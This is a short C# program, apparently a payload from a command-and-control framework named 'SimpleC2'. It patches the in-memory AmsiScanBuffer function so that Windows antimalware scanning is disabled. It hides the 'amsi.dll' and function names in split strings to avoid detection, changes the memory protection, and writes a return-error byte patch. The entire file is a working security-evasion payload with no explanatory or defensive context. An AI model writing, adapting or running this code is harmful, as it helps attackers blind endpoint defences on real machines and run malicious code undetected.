//C:\Users\reyals\source\SimpleC2\payloads\amsibypass\amsibypass.csproj
using System;
using System.Runtime.InteropServices;

namespace AddAMSIBP
{
    public class Program
    {

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static void copy(Byte[] Patch, IntPtr Address)
        {
            Marshal.Copy(Patch, 0, Address, 6);
        }

        public static void Main(string[] args)
        {
            IntPtr Library = LoadLibrary("a" + "m" + "s" + "i" + ".dll");
            IntPtr Address = GetProcAddress(Library, "Amsi" + "Scan" + "Buffer");
            uint p;
            VirtualProtect(Address, (UIntPtr)5, 0x40, out p);
            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            copy(Patch, Address);
            Console.WriteLine("Patch Applied!");
        }
    }
}